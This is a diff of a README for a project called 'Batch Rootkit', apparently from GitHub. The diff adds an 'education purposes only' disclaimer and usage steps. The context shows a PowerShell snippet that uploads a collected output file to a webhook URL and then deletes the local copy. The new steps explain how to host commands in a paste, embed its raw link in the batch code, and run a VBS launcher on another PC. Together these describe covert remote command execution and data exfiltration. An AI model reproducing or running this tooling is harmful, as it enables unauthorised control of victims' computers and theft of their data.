@@ -1,9 +1,12 @@
 # Batch Rootkit
-> __Note__ 
-> **If you are utilizing my program for commercial purposes, kindly provide attribution to my GitHub account.**
 
 > __Warning__ 
 > **I hereby declare that I am not liable for any damages caused by the program. If you experience any problems with my code, feel free to reach out to me on Discord.**
+
+
+> __Warning__ 
+> **ITS EDUCATION PURPOSES ONLY**
+
 
 ## Contact
 In case you require any assistance with your project, please do not hesitate to contact me on Discord.
@@ -27,5 +30,11 @@ $client = New-Object System.Net.WebClient
 $client.UploadFile($webhookUrl, $outputFile)
 Remove-Item $outputFile
  ```
-5. To make cmd commend use ```cmd /c``` 
+5. To use cmd commend use ```cmd /c```  to use powershell commend just use your commend without ```cmd /c```
+6. Save your paste
+7. Press raw button
+8. Copy link
+9. Paste this link into batch code
+10. Run inv.vbs on other pc
+11. Done
 
